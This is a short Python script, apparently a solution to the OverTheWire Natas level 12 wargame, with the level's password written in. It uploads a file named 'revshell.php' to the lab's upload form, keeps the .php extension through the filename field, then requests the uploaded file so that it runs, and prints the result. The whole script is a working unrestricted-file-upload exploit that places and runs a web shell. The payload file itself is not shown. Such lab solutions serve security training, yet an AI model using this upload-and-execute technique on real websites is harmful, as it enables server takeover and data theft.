import os
import requests
import re


username = 'natas12'
password = 'YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG'

url = 'http://%s.natas.labs.overthewire.org/' % username

# get the absolute file path of the 'revshell.php' file
file_path = os.path.abspath('revshell.php')

# open the file and prepare it for upload
with open(file_path, 'rb') as f:
    files = {'uploadedfile': f}

    # send the POST request to upload the file
    response = requests.post(url, auth=(username, password), files=files, data={'filename': 'revshell.php', 'MAX_FILE_SIZE': '1000'})

# check if the upload was successful
if response.ok:
    print('File uploaded successfully.')

    # send a GET request to execute the uploaded file
    shell_url = url + 'upload/revshell.php'
    response = requests.get(shell_url, auth=(username, password))

    # print the response from the shell
    print(response.content.decode())
else:
    print('File upload failed.')